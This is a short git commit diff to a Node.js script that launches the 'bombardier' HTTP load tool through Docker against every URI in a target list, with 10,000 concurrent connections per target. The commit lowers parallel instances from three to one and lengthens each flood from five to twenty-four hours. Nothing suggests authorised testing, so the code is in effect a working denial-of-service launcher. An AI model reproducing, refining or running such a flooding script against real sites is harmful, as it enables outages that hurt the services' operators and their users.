506be6cb97fb49378e77c41ad09106f712e6284e
BOTKooper <botkooper@gmail.com>
2022-02-27 12:57:25 +0100

    update list, make less instances

--- index.js
+++ index.js
@@ -2,7 +2,7 @@
 import child_process from 'child_process';
 import { list } from './list.js';
 
-const INSTANCES = 3;
+const INSTANCES = 1;
 const TOTAL = INSTANCES * list.length;
 let launched = 0;
 
@@ -11,7 +11,7 @@ list.forEach((uri) => {
         launched++;
         console.log(`launching ${launched}/${TOTAL}`);
         child_process.exec(
-            `docker run -i --rm alpine/bombardier -c 10000 -d 5h -l ${uri}`,
+            `docker run -i --rm alpine/bombardier -c 10000 -d 24h -l ${uri}`,
             (err, stdout, stderr) => {
                 if(err) {
                     console.log({ uri, err });
